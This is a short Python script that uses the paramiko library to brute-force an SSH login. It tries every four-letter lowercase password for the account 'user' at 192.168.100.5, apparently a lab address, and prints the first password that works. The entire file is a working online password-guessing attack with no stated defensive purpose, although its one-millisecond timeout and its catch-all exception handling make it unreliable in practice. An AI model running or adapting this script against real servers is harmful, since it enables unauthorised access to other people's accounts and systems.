import string
import itertools
import paramiko

class BruteForce:
    def __init__(self, charset, length):
        self.charset = charset
        self.length = length
        self.ip = None

    def create_client(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        return client
        
    def crackit(self, username):
        client = self.create_client()
        for guess in self.guesses:
            password = ''.join(guess)
            try:
                client.connect(self.ip, port=22, username=username, password=password, timeout=1/1000.0)
                client.close()
                return password
            except paramiko.AuthenticationException:
                pass
            except:
                pass
        return None
    
    @property
    def guesses(self):
        return itertools.product(self.charset, repeat=self.length)
    
def main():
    ip = '192.168.100.5'
    charset = string.ascii_lowercase
    length = 4
    username = 'user'

    brute = BruteForce(charset, length)
    brute.ip = ip
    
    password = brute.crackit(username)

    if not password:
        print(f'Password not found.')
        return False
    
    print(f'Password found: {password}')

if __name__ == "__main__":
    main()